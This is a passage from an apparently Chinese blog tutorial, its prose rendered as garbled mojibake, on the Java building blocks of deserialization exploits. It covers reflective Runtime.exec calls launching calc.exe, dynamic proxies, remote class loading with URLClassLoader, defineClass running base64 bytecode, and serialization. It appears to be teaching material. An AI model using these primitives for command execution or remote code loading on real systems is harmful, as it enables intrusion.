å¤šä¸ªå‚æ•°å€¼)<br></code></pre></td></tr></table></figure><p><code>method.invoke</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯ç±»å®ä¾‹å¯¹è±¡ï¼Œå¦‚æœè°ƒç”¨çš„æ˜¯<code>static</code>æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°å€¼å¯ä»¥ä¼ <code>null</code>ï¼Œå› ä¸ºåœ¨Javaä¸­è°ƒç”¨é™æ€æ–¹æ³•æ˜¯ä¸éœ€è¦æœ‰ç±»å®ä¾‹çš„ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡<code>ç±»å.æ–¹æ³•å(å‚æ•°)</code>çš„æ–¹å¼è°ƒç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ›å»ºRuntimeç±»ç¤ºä¾‹ï¼Œç­‰ä»·äº Runtime rt = new Runtime();</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br><br><span class="hljs-comment">// è·å–Runtimeçš„exec(String cmd)æ–¹æ³•</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">runtimeMethod</span> <span class="hljs-operator">=</span> runtimeClass1.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><br><span class="hljs-comment">// è°ƒç”¨execæ–¹æ³•ï¼Œç­‰ä»·äº rt.exec(cmd);</span><br>runtimeMethod.invoke(runtimeInstance, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="åå°„è°ƒç”¨æˆå‘˜å˜é‡"><a href="#åå°„è°ƒç”¨æˆå‘˜å˜é‡" class="headerlink" title="åå°„è°ƒç”¨æˆå‘˜å˜é‡"></a>åå°„è°ƒç”¨æˆå‘˜å˜é‡</h3><p>Javaåå°„ä¸ä½†å¯ä»¥è·å–ç±»æ‰€æœ‰çš„æˆå‘˜å˜é‡åç§°ï¼Œè¿˜å¯ä»¥æ— è§†æƒé™ä¿®é¥°ç¬¦å®ç°ä¿®æ”¹å¯¹åº”çš„å€¼ã€‚</p><p><strong>è·å–å½“å‰ç±»æŒ‡å®šçš„æˆå‘˜å˜é‡</strong></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Field</span> <span class="hljs-built_in">field</span> = clazz.getDecalaredField(<span class="hljs-string">&quot;å˜é‡å&quot;</span>)<br></code></pre></td></tr></table></figure><p><code>getField</code>å’Œ<code>getDeclaredField</code>çš„åŒºåˆ«åŒ<code>getMethod</code>å’Œ<code>getDeclaredMethod</code></p><p><strong>è·å–æˆå‘˜å˜é‡å€¼</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Object obj <span class="hljs-operator">=</span> field.get(ç±»å®ä¾‹å¯¹è±¡)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>ä¿®æ”¹æˆå‘˜å˜é‡å€¼</strong></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-built_in">field</span>.<span class="hljs-built_in">set</span>(ç±»å®ä¾‹å¯¹è±¡, ä¿®æ”¹åçš„å€¼);<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬æ²¡æœ‰ä¿®æ”¹æˆå‘˜å˜é‡çš„æƒé™æ—¶å¯ä»¥ä½¿ç”¨ <code>field.setAccessable(true)</code> çš„æ–¹å¼ä¿®æ”¹è®¿é—®å˜é‡çš„è®¿é—®æƒé™ã€‚</p><h2 id="JavaåŠ¨æ€ä»£ç†"><a href="#JavaåŠ¨æ€ä»£ç†" class="headerlink" title="JavaåŠ¨æ€ä»£ç†"></a>JavaåŠ¨æ€ä»£ç†</h2><p>åŠ¨æ€ä»£ç†æ¯”è¾ƒå¸¸è§çš„ç”¨å¤„ï¼š<strong>åœ¨ä¸ä¿®æ”¹ç±»çš„æºç çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ä»£ç†çš„æ–¹å¼ä¸ºç±»çš„æ–¹æ³•æä¾›æ›´å¤šçš„åŠŸèƒ½</strong></p><p>ä¾‹å¦‚å¼€å‘å®ç°äº†ä¸šåŠ¡éƒ¨åˆ†çš„ä»£ç ï¼Œå¿½ç„¶æˆ‘ä»¬æœŸæœ›åœ¨è¿™äº›ä¸šåŠ¡ä»£ç ä¸­å¤šæ·»åŠ æ—¥å¿—è®°å½•åŠŸèƒ½çš„æ—¶å€™ï¼Œä¸€ä¸ªä¸€ä¸ªç±»å»æ·»åŠ ä»£ç å¾ˆéº»çƒ¦ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥é€šè¿‡åŠ¨æ€ä»£ç†çš„æ–¹å¼å¯¹æœŸå¾…æ·»åŠ æ—¥å¿—çš„ç±»è¿›è¡Œä»£ç†ã€‚</p><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p>Workæ¥å£éœ€è¦å®ç°workå‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Work</span>&#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">work</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Teacherç±»å®ç°äº†Workæ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Work</span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">work</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;teach students&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Teacher&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>WorkHandlerç”¨æ¥å¤„ç†è¢«ä»£ç†çš„å¯¹è±¡ï¼Œå®ƒå¿…é¡»ç»§æ‰¿InvocationHandleræ¥å£ï¼Œå¹¶å®ç°invokeæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WorkHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br>    <span class="hljs-comment">// ä»£ç†ç±»ä¸­çš„çœŸå®å¯¹è±¡</span><br>    <span class="hljs-keyword">private</span> Object obj;<br>    <span class="hljs-comment">// æ„é€ å‡½æ•°ï¼Œç»™çœŸå®å¯¹è±¡èµ‹å€¼</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">WorkHandler</span><span class="hljs-params">(Object obj)</span>&#123;<br>        <span class="hljs-built_in">this</span>.obj = obj;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable&#123;<br>        <span class="hljs-comment">// åœ¨çœŸå®å¯¹è±¡æ‰§è¡Œä¹‹å‰æˆ‘ä»¬å¯ä»¥æ·»åŠ è‡ªå·±çš„æ“ä½œ</span><br>        System.out.println(<span class="hljs-string">&quot;before invoke...&quot;</span>);<br>        <span class="hljs-comment">// javaåå°„,ç”¨æ¥è°ƒç”¨objå¯¹è±¡çš„methodæ–¹æ³•,ä¼ å…¥å‚æ•°ä¸ºargs</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">invoke</span> <span class="hljs-operator">=</span> method.invoke(obj, args);<br>        <span class="hljs-comment">// åœ¨çœŸå®å¯¹è±¡æ‰§è¡Œåæˆ‘ä»¬å¯ä»¥æ·»åŠ è‡ªå·±çš„æ“ä½œ</span><br>        System.out.println(<span class="hljs-string">&quot;after invoke...&quot;</span>);<br>        <span class="hljs-keyword">return</span> invoke;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ExampleProxyç±»ä¸­é€šè¿‡<code>Proxy.newProxyInstance</code>è¿›è¡ŒåŠ¨æ€ä»£ç†ï¼Œè¿™æ ·å½“æˆ‘ä»¬è°ƒç”¨ä»£ç†å¯¹è±¡proxyå¯¹è±¡çš„workæ–¹æ³•çš„æ—¶å€™ï¼Œ<strong>å®é™…ä¸Šè°ƒç”¨çš„æ˜¯WorkHandlerçš„invokeæ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExampleProxy</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-comment">// è¦ä»£ç†çš„çœŸå®å¯¹è±¡</span><br>        <span class="hljs-type">Work</span> <span class="hljs-variable">people</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>();<br>        <span class="hljs-comment">// ä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†ç¨‹åºï¼Œæˆ‘ä»¬å°†è¦ä»£ç†çš„çœŸå®å¯¹è±¡ä¼ å…¥ä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†çš„æ„é€ å‡½æ•°ä¸­ï¼Œæœ€ç»ˆä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†é™ˆæ—­ä¼šè°ƒç”¨çœŸå®å¯¹è±¡çš„æ–¹æ³•</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WorkHandler</span>(people);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * é€šè¿‡Proxyç±»çš„newProxyInstanceæ–¹æ³•åˆ›å»ºä»£ç†å¯¹è±¡</span><br><span class="hljs-comment">        * å‚æ•°ä¸€: handler.getClass().getClassLoader() ä½¿ç”¨handlerå¯¹è±¡çš„classloaderå¯¹è±¡æ¥åŠ è½½æˆ‘ä»¬çš„ä»£ç†å¯¹è±¡</span><br><span class="hljs-comment">        * å‚æ•°äºŒ: people.getClass().getInterfaces() ä¸ºä»£ç†ç±»æä¾›çš„æ¥å£æ˜¯çœŸå®å¯¹è±¡å®ç°çš„æ¥å£ï¼Œè¿™æ ·ä»£ç†å¯¹è±¡å°±èƒ½åƒçœŸå®å¯¹è±¡ä¸€æ ·è°ƒç”¨æ¥å£çš„æ‰€æœ‰æ–¹æ³•</span><br><span class="hljs-comment">        * å‚æ•°ä¸‰: handler å°†ä»£ç†å¯¹è±¡å…³è”åˆ°ä¸Šé¢çš„InvocationHandlerå¯¹è±¡ä¸Š</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">Work</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Work) Proxy.newProxyInstance(handler.getClass().getClassLoader(), people.getClass().getInterfaces(), handler);<br>        System.out.println(proxy.work());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œè¾“å‡ºï¼š</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">before</span></span> invoke...<br>teach students<br><span class="hljs-function"><span class="hljs-title">after</span></span> invoke...<br></code></pre></td></tr></table></figure><p>åœ¨æ²¡æœ‰æ”¹å˜Teacherç±»çš„å‰æä¸‹é€šè¿‡ä»£ç†Workæ¥å£ï¼Œå®ç°äº†workå‡½æ•°è°ƒç”¨çš„é‡å†™ã€‚</p><h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h2><p>Javaæ˜¯ä¸€ä¸ªä¾èµ–ä¸JVMå®ç°çš„è·¨å¹³å°çš„å¼€å‘è¯­è¨€ã€‚Javaç¨‹åºåœ¨è¿è¡Œå‰éœ€è¦å…ˆç¼–è¯‘æˆ Classæ–‡ä»¶ï¼ŒJavaç±»åŠ è½½åˆå§‹åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨ <code>java.lang.ClassLoader</code> åŠ è½½ç±»å­—èŠ‚ç ï¼Œ<code>ClassLoader</code> ä¼šè°ƒç”¨JVMçš„nativeæ–¹æ³•æ¥å®ç°ä¸€ä¸ª<code>java.lang.Class</code>å®ä¾‹</p><p>ä¸€åˆ‡çš„Javaç±»éƒ½å¿…é¡»ç»è¿‡JVMåŠ è½½åæ‰èƒ½è¿è¡Œï¼Œè€Œ<code>ClassLoader</code>çš„ä¸»è¦ä½œç”¨å°±æ˜¯Javaç±»æ–‡ä»¶çš„åŠ è½½ã€‚åœ¨JVMç±»åŠ è½½å™¨ä¸­æœ€é¡¶å±‚çš„æ˜¯<code>Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼‰</code>ã€<code>Extension ClassLoaderï¼ˆæ‰©å±•ç±»åŠ è½½å™¨ï¼‰</code>ã€<code>App ClassLoaderï¼ˆç³»ç»Ÿç±»åŠ è½½å™¨ï¼‰</code></p><p><code>AppClassLoader</code>æ˜¯é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œå¦‚æœç±»åŠ è½½æ—¶æˆ‘ä»¬ä¸æŒ‡å®šç±»åŠ è½½å™¨çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤ä¼šä½¿ç”¨<code>AppClassLoader</code>åŠ è½½ç±»</p><p><code>ClassLoader.getSystemClassLoader()</code>è¿”å›çš„ç³»ç»Ÿç±»åŠ è½½å™¨ä¹Ÿæ˜¯<code>AppClassLoader</code>ã€‚</p><p><strong>ClassLoader ç±»æ ¸å¿ƒæ–¹æ³•ï¼š</strong></p><ol><li>loadClassï¼ˆåŠ è½½æŒ‡å®šçš„Javaç±»ï¼‰</li><li>findClassï¼ˆæŸ¥æ‰¾æŒ‡å®šçš„Javaç±»ï¼‰</li><li>findLoadedClassï¼ˆæŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±»ï¼‰</li><li>defineClassï¼ˆå®šä¹‰ä¸€ä¸ªJavaç±»ï¼‰</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ClassLoaderåŠ è½½TestHelloWorldç¤ºä¾‹</span><br><span class="hljs-built_in">this</span>.getClass().getClassLoader().loadClass(<span class="hljs-string">&quot;ysoserial.test.TestHelloWorld&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p><code>URLClassLoader</code> æä¾›äº†åŠ è½½è¿œç¨‹èµ„æºçš„èƒ½åŠ›ï¼Œåœ¨å†™æ¼æ´åˆ©ç”¨çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç‰¹å¾æ¥è¿œç¨‹åŠ è½½jarå®ç°è¿œç¨‹ç±»æ–¹æ³•è°ƒç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">URL[] urls = &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8000/&quot;</span>)&#125;;<br><span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(urls);<br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> loader.loadClass(<span class="hljs-string">&quot;Hello&quot;</span>);<br>c.newInstance();<br></code></pre></td></tr></table></figure><p>æ”¾ç½®å¥½ <code>http://localhost:8000/Hello.class</code>ï¼Œç¨‹åºä¼šè¯·æ±‚<code>/Hello.class</code>æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œæ–‡ä»¶ä¸­çš„å­—èŠ‚ç ã€‚</p><h3 id="åˆ©ç”¨defineClassç›´æ¥åŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨defineClassç›´æ¥åŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨defineClassç›´æ¥åŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨defineClassç›´æ¥åŠ è½½å­—èŠ‚ç </h3><p>ä¸ç®¡æ˜¯åŠ è½½è¿œç¨‹classæ–‡ä»¶è¿˜æ˜¯æœ¬åœ°çš„classæˆ–jaræ–‡ä»¶ï¼ŒJavaéƒ½ç»è¿‡äº†ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ClassLoader#loadClass =&gt; ClassLoader#findClass =&gt; ClassLoader#defineClass<br></code></pre></td></tr></table></figure><p><code>loadClass</code>ï¼šä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼Œåœ¨æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ<code>findClass</code></p><p><code>findClass</code>ï¼šæ ¹æ®åŸºäºURLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå¯ä»¥æ˜¯æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹æœåŠ¡å™¨ï¼Œè¯»å–å­—èŠ‚ç åäº¤ç»™<code>defineClass</code></p><p><code>defineClass</code>ï¼šå¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œè¿”å›ä¸€ä¸ªJavaç±»</p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨defineClassåŠ è½½å­—èŠ‚ç ï¼Œè·å–ä¸€ä¸ªç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExampleClassLoader</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        hello.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œè¾“å‡ºï¼šHello World</p><p>ç³»ç»Ÿçš„<code>ClassLoader#defineClass</code>æ˜¯ä¸€ä¸ªä¿æŠ¤å±æ€§ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥åœ¨å¤–éƒ¨è®¿é—®ï¼Œåªèƒ½é€šè¿‡åå°„æ¥è°ƒç”¨ã€‚ç°å®åœºæ™¯ä¸­ï¼Œå› ä¸ºdefineClassæ–¹æ³•ä½œç”¨åŸŸæ˜¯ä¸å¼€æ”¾çš„ï¼Œæˆ‘ä»¬å¾ˆéš¾åˆ©ç”¨ã€‚ä½†å®ƒæˆä¸ºäº†å¸¸ç”¨æ”»å‡»é“¾<code>TemplatesImpl</code>çš„åŸºç¡€ã€‚</p><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><p><strong>Javaå¯¹è±¡åºåˆ—åŒ–</strong>æŒ‡çš„æ˜¯å°†ä¸€ä¸ªJavaç±»å®ä¾‹åºåˆ—åŒ–æˆå­—èŠ‚æ•°ç»„ï¼Œç”¨äºå­˜å‚¨å¯¹è±¡å®ä¾‹åŒ–ä¿¡æ¯ï¼ˆç±»æˆå‘˜å˜é‡å’Œå±æ€§å€¼ï¼‰ã€‚<strong>Javaååºåˆ—åŒ–</strong>å¯ä»¥å°†åºåˆ—åŒ–åçš„äºŒè¿›åˆ¶æ•°ç»„è½¬æ¢æœªå¯¹åº”çš„Javaç±»å®ä¾‹ã€‚</p><p>ååºåˆ—åŒ–å¯¹è±¡æ—¶æœ‰è¿™äº›é™åˆ¶ï¼š</p><ol><li>è¢«ååºåˆ—åŒ–çš„ç±»å¿…é¡»å­˜åœ¨</li><li><code>serialVersionUID</code>å€¼å¿…é¡»ä¸€è‡´</li><li>å®ç°äº†Serializableæ¥å£</li></ol><p><strong>ååºåˆ—åŒ–ç±»å¯¹è±¡æ—¶ä¸ä¼šè°ƒç”¨è¯¥ç±»æ„é€ æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExampleSerialize</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUsername</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.username = name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.username;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-comment">// åˆ›å»ºExampleSerializeç±»ï¼Œå¹¶ç±»è®¾ç½®å±æ€§å€¼</span><br>        <span class="hljs-type">ExampleSerialize</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExampleSerialize</span>();<br>        t.setUsername(<span class="hljs-string">&quot;aurey&quot;</span>);<br><br>        <span class="hljs-comment">// åˆ›å»ºJavaå¯¹è±¡åºåˆ—åŒ–è¾“å‡ºæµå¯¹è±¡</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br><br>        <span class="hljs-comment">// åºåˆ—åŒ–ExampleSerializeç±»</span><br>        out.writeObject(t);<br>        out.close();<br><br>        <span class="hljs-comment">// æ‰“å°ExampleSerializeç±»åºåˆ—åŒ–ä»¥åçš„å­—èŠ‚æ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶å­˜å‚¨åˆ°æ–‡ä»¶ä¸­æˆ–è€…é€šè¿‡Socketå‘é€åˆ°è¿œç¨‹æœåŠ¡åœ°å€</span><br>        System.out.println(<span class="hljs-string">&quot;ExampleSerializeç±»åºåˆ—åŒ–åçš„å­—èŠ‚æ•°ç»„:&quot;</span> + Arrays.toString(baos.toByteArray()));<br><br>        <span class="hljs-comment">// åˆ©ç”¨ExampleSerializeç±»ç”Ÿæˆçš„äºŒè¿›åˆ¶æ•°ç»„åˆ›å»ºäºŒè¿›åˆ¶è¾“å…¥æµå¯¹è±¡ç”¨äºååºåˆ—åŒ–æ“ä½œ</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br><br>        <span class="hljs-comment">// é€šè¿‡ååºåˆ—åŒ–è¾“å…¥æµ(bais),åˆ›å»ºJavaå¯¹è±¡è¾“å…¥æµ(ObjectInputStream)å¯¹è±¡</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br><br>        <span class="hljs-comment">// ååºåˆ—åŒ–è¾“å…¥æµæ•°æ®ä¸ºExampleSerializeå¯¹è±¡</span><br>        <span class="hljs-type">ExampleSerialize</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> (ExampleSerialize) in.readObject();<br>        System.out.println(<span class="hljs-string">&quot;ç”¨æˆ·å:&quot;</span> + test.getUsername());<br><br>        <span class="hljs-comment">// å…³é—­ObjectInputStreamè¾“å…¥æµ</span><br>        in.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å…³é”®ä»£ç ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 